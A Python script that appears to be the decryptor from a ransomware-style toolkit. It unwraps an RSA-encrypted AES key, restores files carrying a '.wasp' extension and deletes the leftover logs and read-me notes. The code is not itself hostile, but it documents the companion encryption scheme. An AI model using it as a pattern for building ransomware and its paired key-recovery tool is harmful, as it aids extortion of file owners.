from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from cryptography.fernet import Fernet
import os
import sys 

class Decryption:
    def __init__(self):
        self.aes_key = None
        self.decryptor=None
        self.filelist = []
        self.directories =[]
        for i in range(1,len(sys.argv)):
            self.directories.append(sys.argv[i])


    def rsa_decryption(self):
        with open('encrypted_aes_key.txt', 'rb') as f:
            enc_aes_key = f.read()
        
        private_key = RSA.importKey(open("private.pem").read())
        private_decryptor = PKCS1_OAEP.new(private_key)    
        # Decrypt loaded aes key
        dec_aes_key = private_decryptor.decrypt(enc_aes_key)
        with open('aes.key', 'wb') as f:
            f.write(dec_aes_key)
        
        print(f"[+] Private key:\n {private_key.n}")
        print(f"[+] Decrypted aes key: {dec_aes_key}")
        self.aes_key = dec_aes_key
        self.decryptor = Fernet(self.aes_key)

    def getfile(self):
        for path in self.directories:
            for root, dirs, files in os.walk(path):
                for file in files:
                    #loggin all files in a list
                    self.filelist.append(os.path.join(root,file))
                #add all folders to a list 
                for folder in dirs:
                    self.directories.append(os.path.join(root,folder))

    def decrypt(self):
        for file in self.filelist:
            try:
                #decrypting files
                if file.endswith(".wasp"):
                    with open(file, 'rb') as datain:
                        data = datain.read()
                        decrypted_data = self.decryptor.decrypt(data)
                    #writing decrypted files to disk
                    with open(file.replace('.wasp',''), "wb") as dwasp:
                        dwasp.write(decrypted_data)
                    #remove encrypted file
                    os.remove(file)
            #log exceptions
            except Exception as e:
                with open("decryption.log" , "a+") as log:
                    log.write(str(e)+"\n")
                pass

    def clean(self):
        #remove encryption logs
        junks = ["failed_encryption.log", "encrypted_files.log", "encrypted_aes_key.txt"]

        for junk in junks:
            try:
                os.remove(junk)
            except Exception:
                pass

        for folder in self.directories:
            try:
                os.remove(f"{folder}/encryption_read_me.txt")
            except Exception:
                pass


def main():
    run = Decryption()
    print("__START DECRYPTION__")
    print("[+] decrypting aes key..")
    run.rsa_decryption()
    print("[+] getting files list..")
    run.getfile()
    print("[+] aes decryption start.")
    run.decrypt()
    print("[+] aes decryption end.")
    print("[+] cleaning junk files..")
    run.clean()
    print("__END DECRYPTION__")

if len(sys.argv) < 2:
    sys.exit(f"usage: {sys.argv[0]} folder1 folder2 folder3...")
try:
    main()
except Exception as E:
    print("[-] fix the following error:\n" + str(E))
